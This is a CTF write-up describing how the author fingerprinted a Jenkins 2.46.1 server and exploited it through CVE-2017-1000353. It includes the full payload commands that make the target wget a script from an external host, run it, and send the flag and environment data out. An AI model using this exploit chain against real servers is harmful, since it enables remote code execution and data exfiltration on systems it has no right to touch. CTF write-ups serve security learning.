# Country(400):  Serbia
----------
Description:  Get me the flag!

http://52.9.13.75:8080
----------
Hint:  How to get in should be known, but good luck getting out.
----------
Attachments:  []

~!|----------|!~

Ok lets see if we can hit this ip address with curl

```
/src/ctf/Serbia(master*) # curl -vv http://52.9.13.75:8080                                                                                                                                                                  root@3614dc210c9a
* Rebuilt URL to: http://52.9.13.75:8080/
*   Trying 52.9.13.75...
* TCP_NODELAY set
* Connected to 52.9.13.75 (52.9.13.75) port 8080 (#0)
> GET / HTTP/1.1
> Host: 52.9.13.75:8080
> User-Agent: curl/7.61.0
> Accept: */*
>
< HTTP/1.1 403 Forbidden
< Date: Sun, 21 Oct 2018 00:23:44 GMT
< X-Content-Type-Options: nosniff
< Set-Cookie: JSESSIONID.d7f7174f=1xse438rpuapd2jg76d4abbnp;Path=/;HttpOnly
< Expires: Thu, 01 Jan 1970 00:00:00 GMT
< Content-Type: text/html;charset=UTF-8
< X-Hudson: 1.395
< X-Jenkins: 2.46.1
< X-Jenkins-Session: 99540f0f
< X-You-Are-Authenticated-As: anonymous
< X-You-Are-In-Group-Disabled: JENKINS-39402: use -Dhudson.security.AccessDeniedException2.REPORT_GROUP_HEADERS=true or use /whoAmI to diagnose
< X-Required-Permission: hudson.model.Hudson.Read
< X-Permission-Implied-By: hudson.security.Permission.GenericRead
< X-Permission-Implied-By: hudson.model.Hudson.Administer
< Content-Length: 793
< Server: Jetty(9.2.z-SNAPSHOT)
<
<html><head><meta http-equiv='refresh' content='1;url=/login?from=%2F'/><script>window.location.replace('/login?from=%2F');</script></head><body style='background-color:white; color:white;'>


Authentication required
<!--
You are authenticated as: anonymous
Groups that you are in:

Permission you need to have (but didn't): hudson.model.Hudson.Read
 ... which is implied by: hudson.security.Permission.GenericRead
 ... which is implied by: hudson.model.Hudson.Administer
-->

* Connection #0 to host 52.9.13.75 left intact
</body></html>
```

Cool.. basic auth

lookk like it might a hudson server. its running an odler version of jetty


It looks like there is a cve for directory traversal.
https://www.exploit-db.com/exploits/36318/


so it seems like the security is enabled on this jenkins server
and that exploit is bullshit and not useful.


On another hand i noticed that we have  a new header when i try to go to the 
login page of this jenkins instance, which could help me out with getting the file out, or getting me to it.
https://wiki.jenkins.io/display/JENKINS/Instance+Identity

```
>
< HTTP/1.1 200 OK
< Date: Sun, 21 Oct 2018 00:41:06 GMT
< X-Content-Type-Options: nosniff
< Expires: Thu, 01 Jan 1970 00:00:00 GMT
< Cache-Control: no-cache,no-store,must-revalidate
< X-Hudson-Theme: default
< Content-Type: text/html;charset=UTF-8
< Set-Cookie: JSESSIONID.d7f7174f=1swld2f2qf5td506ll3ztwglc;Path=/;HttpOnly
< X-Hudson: 1.395
< X-Jenkins: 2.46.1
< X-Jenkins-Session: 99540f0f
< X-Frame-Options: sameorigin
< X-Instance-Identity: MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmsOQR+hDUxpNRYdGYMvK1MWrgpl0M0Pb/v+ug0CGE5rdDYAwN0S492d2WIlHVMOQ82kIcUfWwgJgW/51twPA2B5i74BWo4s04OsJNz86nQgNVyOB0LL9Pn4Jigys/CIatJxALPEX411ZtInup5pM/fz0Q9OLNdYbMfiYaGk6E/92LPMpdxZKkf5M5zi012LvO/0sgEGrnu8IW0GOWiXOyqEVZbamwbT4JeL5S0MqO+K9CyzI0+GWIOLyjOEfPMy0tBiI3OS6B+ygrXYkRuSQN5mKDU2vpjSElBgcBKKwIagtYos+wF+ecUQ1Upnjsw9RgqwlwGe3yaFHHg0flJ2X1QIDAQAB
< X-SSH-Endpoint: 52.9.13.75:38279
< Content-Length: 5875
< Server: Jetty(9.2.z-SNAPSHOT)
<
```


Now this remote code execution is juicy if it works, its a remote execution vulnerability.

https://www.cvedetails.com/cve/CVE-2017-1000353/

forget it, that went no where, now this guy is promising because it might just work with this version

https://github.com/nixawk/labs/blob/master/CVE-2017-1000353/exploit.py

so what im actually going to do for this challenge, is craft
such a payload so that it curls a publicly accessible webserver
with the contents of the /etc/flag.txt

upon installing locally the same version of jenkins i was greetedd with so many different vulnerabilities.


the command to execute


so it turns out that i needed to exploit this remote command thing, to download python script into the remote server, which will dump
some env stuff(and hopefully the flag) to a remote url.

anywhoo

```
java -jar payload.jar get-dumper.ser "wget -O /tmp/dumper.py http://djmittens.github.io/dumper.py"

```

```
java -jar payload.jar exec-dumper.ser "python /tmp/dumper.py"
```

then i just simply ran the modified exploit.
and voila.

```
etc=/tmp/flag.txt
/usr/lib/python2.7/dist-packages/bzrlib/help_topics/en&flag=CK{45a1283751ac86627567b1c3499829f25174dd5c}
&etc-err=find: `/root': Permission deni
```

what a turd this challenge was :(
    especially cause alex quasch got there first.